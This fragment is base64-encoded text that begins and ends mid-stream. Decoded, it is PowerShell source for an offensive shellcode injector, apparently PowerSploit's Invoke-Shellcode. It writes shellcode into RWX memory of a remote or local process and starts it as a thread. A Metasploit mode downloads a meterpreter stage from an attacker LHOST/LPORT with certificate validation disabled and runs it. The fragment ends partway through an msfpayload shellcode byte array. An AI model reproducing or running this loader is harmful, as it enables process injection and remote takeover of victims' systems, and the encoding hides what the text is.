gaWYgQ1BVIGlzIDY0LWJpdAogICAgICAgIHsKICAgICAgICAgICAgIyBEZXRlcm1pbmUgaXMgdGhlIHByb2Nlc3Mgc3BlY2lmaWVkIGlzIDMyIG9yIDY0IGJpdAogICAgICAgICAgICAkSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRoUHJvY2VzcywgW1JlZl0gJElzV293NjQpIHwgT3V0LU51bGwKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgoISRJc1dvdzY0KSAtYW5kICRQb3dlclNoZWxsMzJiaXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdVbmFibGUgdG8gaW5qZWN0IDY0LWJpdCBzaGVsbGNvZGUgZnJvbSB3aXRoaW4gMzItYml0IFBvd2Vyc2hlbGwuIFVzZSB0aGUgNjQtYml0IHZlcnNpb24gb2YgUG93ZXJzaGVsbCBpZiB5b3Ugd2FudCB0aGlzIHRvIHdvcmsuJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJElzV293NjQpICMgMzItYml0IFdvdzY0IHByb2Nlc3MKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdJbmplY3RpbmcgaW50byBhIFdvdzY0IHByb2Nlc3MuJwogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSAjIDY0LWJpdCBwcm9jZXNzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlNjQuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTY0IHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGU2NAogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSAjIDMyLWJpdCBDUFUKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQoKICAgICAgICAjIFJlc2VydmUgYW5kIGNvbW1pdCBlbm91Z2ggbWVtb3J5IGluIHJlbW90ZSBwcm9jZXNzIHRvIGhvbGQgdGhlIHNoZWxsY29kZQogICAgICAgICRSZW1vdGVNZW1BZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICAKICAgICAgICBpZiAoISRSZW1vdGVNZW1BZGRyKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZU1lbUFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgc2hlbGxjb2RlIGludG8gdGhlIHByZXZpb3VzbHkgYWxsb2NhdGVkIG1lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZU1lbUFkZHIsICRTaGVsbGNvZGUsICRTaGVsbGNvZGUuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbgogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZAoKICAgICAgICBpZiAoJElzV293NjQpCiAgICAgICAgewogICAgICAgICAgICAjIEJ1aWxkIDMyLWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDMyCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgIyBCdWlsZCA2NC1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLgogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRSZW1vdGVNZW1BZGRyICRFeGl0VGhyZWFkQWRkciA2NAogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQoKICAgICAgICAjIEFsbG9jYXRlIGlubGluZSBhc3NlbWJseSBzdHViCiAgICAgICAgJFJlbW90ZVN0dWJBZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgCiAgICAgICAgaWYgKCEkUmVtb3RlU3R1YkFkZHIpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVTdHViQWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgV3JpdGUgMzItYml0IGFzc2VtYmx5IHN0dWIgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IHNwYWNlCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJGhQcm9jZXNzLCAkUmVtb3RlU3R1YkFkZHIsICRDYWxsU3R1YiwgJENhbGxTdHViLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbAoKICAgICAgICAjIEV4ZWN1dGUgc2hlbGxjb2RlIGFzIGEgcmVtb3RlIHRocmVhZAogICAgICAgICRUaHJlYWRIYW5kbGUgPSAkQ3JlYXRlUmVtb3RlVGhyZWFkLkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAwLCAkUmVtb3RlU3R1YkFkZHIsICRSZW1vdGVNZW1BZGRyLCAwLCBbSW50UHRyXTo6WmVybykKICAgICAgICAKICAgICAgICBpZiAoISRUaHJlYWRIYW5kbGUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCByZW1vdGUgdGhyZWFkIGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CgogICAgICAgICMgQ2xvc2UgcHJvY2VzcyBoYW5kbGUKICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRoUHJvY2VzcykgfCBPdXQtTnVsbAoKICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtTG9jYWxTaGVsbGNvZGUKICAgIHsKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlNjQuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGU2NAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CiAgICAKICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSBzaGVsbGNvZGUKICAgICAgICAkQmFzZUFkZHJlc3MgPSAkVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgaWYgKCEkQmFzZUFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQmFzZUFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgc2hlbGxjb2RlIHRvIFJXWCBidWZmZXIKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRTaGVsbGNvZGUsIDAsICRCYXNlQWRkcmVzcywgJFNoZWxsY29kZS5MZW5ndGgpCiAgICAgICAgCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCiAgICAgICAgCiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpCiAgICAgICAgewogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRCYXNlQWRkcmVzcyAkRXhpdFRocmVhZEFkZHIgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRCYXNlQWRkcmVzcyAkRXhpdFRocmVhZEFkZHIgNjQKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDY0LWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KCiAgICAgICAgIyBBbGxvY2F0ZSBSV1ggbWVtb3J5IGZvciB0aGUgdGhyZWFkIGNhbGwgc3R1YgogICAgICAgICRDYWxsU3R1YkFkZHJlc3MgPSAkVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICBpZiAoISRDYWxsU3R1YkFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHRocmVhZCBjYWxsIHN0dWIuIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJENhbGxTdHViQWRkcmVzcy5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBjYWxsIHN0dWIgdG8gUldYIGJ1ZmZlcgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJENhbGxTdHViLCAwLCAkQ2FsbFN0dWJBZGRyZXNzLCAkQ2FsbFN0dWIuTGVuZ3RoKQoKICAgICAgICAjIExhdW5jaCBzaGVsbGNvZGUgaW4gaXQncyBvd24gdGhyZWFkCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVUaHJlYWQuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAwLCAkQ2FsbFN0dWJBZGRyZXNzLCAkQmFzZUFkZHJlc3MsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHRocmVhZC4iCiAgICAgICAgfQoKICAgICAgICAjIFdhaXQgZm9yIHNoZWxsY29kZSB0aHJlYWQgdG8gdGVybWluYXRlCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRUaHJlYWRIYW5kbGUsIDB4RkZGRkZGRkYpIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAkVmlydHVhbEZyZWUuSW52b2tlKCRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGggKyAxLCAweDgwMDApIHwgT3V0LU51bGwgIyBNRU1fUkVMRUFTRSAoMHg4MDAwKQogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwogICAgfQoKICAgICMgQSB2YWxpZCBwb2ludGVyIHRvIElzV293NjRQcm9jZXNzIHdpbGwgYmUgcmV0dXJuZWQgaWYgQ1BVIGlzIDY0LWJpdAogICAgJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MKICAgIGlmICgkSXNXb3c2NFByb2Nlc3NBZGRyKQogICAgewogICAgCSRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgCSRJc1dvdzY0UHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRJc1dvdzY0UHJvY2Vzc0FkZHIsICRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlKQogICAgICAgIAogICAgICAgICQ2NGJpdENQVSA9ICR0cnVlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAJJDY0Yml0Q1BVID0gJGZhbHNlCiAgICB9CgogICAgaWYgKFtJbnRQdHJdOjpTaXplIC1lcSA0KQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkZmFsc2UKICAgIH0KCiAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdNZXRhc3Bsb2l0JykKICAgIHsKICAgICAgICBpZiAoISRQb3dlclNoZWxsMzJiaXQpIHsKICAgICAgICAgICAgIyBUaGUgY3VycmVudGx5IHN1cHBvcnRlZCBNZXRhc3Bsb2l0IHBheWxvYWRzIGFyZSAzMi1iaXQuIFRoaXMgYmxvY2sgb2YgY29kZSBpbXBsZW1lbnRzIHRoZSBsb2dpYyB0byBleGVjdXRlIHRoaXMgc2NyaXB0IGZyb20gMzItYml0IFBvd2VyU2hlbGwKICAgICAgICAgICAgIyBHZXQgdGhpcyBzY3JpcHQncyBjb250ZW50cyBhbmQgcGFzcyBpdCB0byAzMi1iaXQgcG93ZXJzaGVsbCB3aXRoIHRoZSBzYW1lIHBhcmFtZXRlcnMgcGFzc2VkIHRvIHRoaXMgZnVuY3Rpb24KCiAgICAgICAgICAgICMgUHVsbCBvdXQganVzdCB0aGUgY29udGVudCBvZiB0aGUgdGhpcyBzY3JpcHQncyBpbnZvY2F0aW9uLgogICAgICAgICAgICAkUm9vdEludm9jYXRpb24gPSAkTXlJbnZvY2F0aW9uLkxpbmUKCiAgICAgICAgICAgICRSZXNwb25zZSA9ICRUcnVlCiAgICAgICAgCiAgICAgICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSB3YW50IHRvIGxhdW5jaCB0aGUgcGF5bG9hZCBmcm9tIHg4NiBQb3dlcnNoZWxsPyIsCiAgICAgICAgICAgICAgICAgICAiQXR0ZW1wdCB0byBleGVjdXRlIDMyLWJpdCBzaGVsbGNvZGUgZnJvbSA2NC1iaXQgUG93ZXJzaGVsbC4gTm90ZTogVGhpcyBwcm9jZXNzIHRha2VzIGFib3V0IG9uZSBtaW51dGUuIEJlIHBhdGllbnQhIFlvdSB3aWxsIGFsc28gc2VlIHNvbWUgYXJ0aWZhY3RzIG9mIHRoZSBzY3JpcHQgbG9hZGluZyBpbiB0aGUgb3RoZXIgcHJvY2Vzcy4iICkgKSApIHsgfQogICAgICAgIAogICAgICAgICAgICBpZiAoICEkUmVzcG9uc2UgKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIFVzZXIgb3B0ZWQgbm90IHRvIGxhdW5jaCB0aGUgMzItYml0IHBheWxvYWQgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbC4gRXhpdCBmdW5jdGlvbgogICAgICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgU2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIHJ1biBpbiBhIG5vbmludGVyYWN0aXZlIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwsIG1ha2Ugc3VyZSB0aGUgLUZvcmNlIHN3aXRjaCBpcyBpbmNsdWRlZCBzbyB0aGF0IHRoZXJlIGlzIG5vIHdhcm5pbmcgcHJvbXB0LgogICAgICAgICAgICBpZiAoJE15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnNbJ0ZvcmNlJ10pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4ZWN1dGluZyB0aGUgZm9sbG93aW5nIGZyb20gMzItYml0IFBvd2VyU2hlbGw6ICRSb290SW52b2NhdGlvbiIKICAgICAgICAgICAgICAgICRDb21tYW5kID0gImZ1bmN0aW9uICQoJE15SW52b2NhdGlvbi5JbnZvY2F0aW9uTmFtZSkge2BuIiArICRNeUludm9jYXRpb24uTXlDb21tYW5kLlNjcmlwdEJsb2NrICsgImBufWBuJCgkUm9vdEludm9jYXRpb24pYG5gbiIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4ZWN1dGluZyB0aGUgZm9sbG93aW5nIGZyb20gMzItYml0IFBvd2VyU2hlbGw6ICRSb290SW52b2NhdGlvbiAtRm9yY2UiCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKSAtRm9yY2VgbmBuIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkQ29tbWFuZEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QXNjaWkuR2V0Qnl0ZXMoJENvbW1hbmQpCiAgICAgICAgICAgICRFbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJENvbW1hbmRCeXRlcykKCiAgICAgICAgICAgICRFeGVjdXRlID0gJyRDb21tYW5kJyArICIgfCAkRW52OndpbmRpclxTeXNXT1c2NFxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgLSIKICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gLUNvbW1hbmQgJEV4ZWN1dGUgfCBPdXQtTnVsbAoKICAgICAgICAgICAgIyBFeGl0IHRoZSBzY3JpcHQgc2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIGJlIHJ1bm5pbmcgZnJvbSB4ODYgUG93ZXJTaGVsbAogICAgICAgICAgICBSZXR1cm4KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFJlc3BvbnNlID0gJFRydWUKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Uga25vdyB3aGF0IHlvdSdyZSBkb2luZz8iLAogICAgICAgICAgICAgICAiQWJvdXQgdG8gZG93bmxvYWQgTWV0YXNwbG9pdCBwYXlsb2FkICckKCRQYXlsb2FkKScgTEhPU1Q9JCgkTGhvc3QpLCBMUE9SVD0kKCRMcG9ydCkiICkgKSApIHsgfQogICAgICAgIAogICAgICAgIGlmICggISRSZXNwb25zZSApCiAgICAgICAgewogICAgICAgICAgICAjIFVzZXIgb3B0ZWQgbm90IHRvIGNhcnJ5IG91dCBkb3dubG9hZCBvZiBNZXRhc3Bsb2l0IHBheWxvYWQuIEV4aXQgZnVuY3Rpb24KICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHN3aXRjaCAoJFBheWxvYWQpCiAgICAgICAgewogICAgICAgICAgICAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAnCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTU0wgPSAnJwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzJwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU1NMID0gJ3MnCiAgICAgICAgICAgICAgICAjIEFjY2VwdCBpbnZhbGlkIGNlcnRpZmljYXRlcwogICAgICAgICAgICAgICAgW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkdHJ1ZSB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgIyBNZXRlcnByZXRlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwLiBBd2Vzb21lIGF1dGhlbnRpY2F0aW9uLCBodWg/CiAgICAgICAgJFJlcXVlc3QgPSAiaHR0cCQoJFNTTCk6Ly8kKCRMaG9zdCk6JCgkTHBvcnQpL0lOSVRNIgogICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlcXVlc3RpbmcgbWV0ZXJwcmV0ZXIgcGF5bG9hZCBmcm9tICRSZXF1ZXN0IgogICAgICAgIAogICAgICAgICRVcmkgPSBOZXctT2JqZWN0IFVyaSgkUmVxdWVzdCkKICAgICAgICAkV2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICRXZWJDbGllbnQuSGVhZGVycy5BZGQoJ3VzZXItYWdlbnQnLCAiJFVzZXJBZ2VudCIpCiAgICAgICAgCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkV2ViQ2xpZW50LkRvd25sb2FkRGF0YSgkVXJpKQogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIiQoJEVycm9yWzBdLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCgogICAgfQogICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NoZWxsY29kZSddKQogICAgewogICAgICAgICMgVXNlcnMgcGFzc2luZyBpbiBzaGVsbGNvZGUgIHRocm91Z2ggdGhlICctU2hlbGxjb2RlJyBwYXJhbWV0ZXIgYXJlIHJlc3BvbnNpYmxlIGZvciBlbnN1cmluZyBpdCB0YXJnZXRzCiAgICAgICAgIyB0aGUgY29ycmVjdCBhcmNoaXRlY2h0dXJlIC0geDg2IHZzLiB4NjQuIFRoaXMgc2NyaXB0IGhhcyBubyB3YXkgdG8gdmFsaWRhdGUgd2hhdCB5b3UgcHJvdmlkZSBpdC4KICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkU2hlbGxjb2RlCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgIyBQb3AgYSBjYWxjLi4uIG9yIHdoYXRldmVyIHNoZWxsY29kZSB5b3UgZGVjaWRlIHRvIHBsYWNlIGluIGhlcmUKICAgICAgICAjIEkgc2luY2VyZWx5IGhvcGUgeW91IHRydXN0IHRoYXQgdGhpcyBzaGVsbGNvZGUgYWN0dWFsbHkgcG9wcyBhIGNhbGMuLi4KICAgICAgICAjIEluc2VydCB5b3VyIHNoZWxsY29kZSBoZXJlIGluIHRoZSBmb3IgMHhYWCwweFhYLC4uLgogICAgICAgICMgMzItYml0IHBheWxvYWQKICAgICAgICAjIG1zZnBheWxvYWQgd2luZG93cy9leGVjIENNRD0iY21kIC9rIGNhbGMiIEVYSVRGVU5DPXRocmVhZAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGUzMiA9IEAoMHhmYywweGU4LDB4ODksMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGQyLDB4NjQsMHg4YiwweDUyLDB4MzAsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHgwYywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweDBmLDB4YjcsMHg0YSwweDI2LDB4MzEsMHhmZiwweDMxLDB4YzAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHg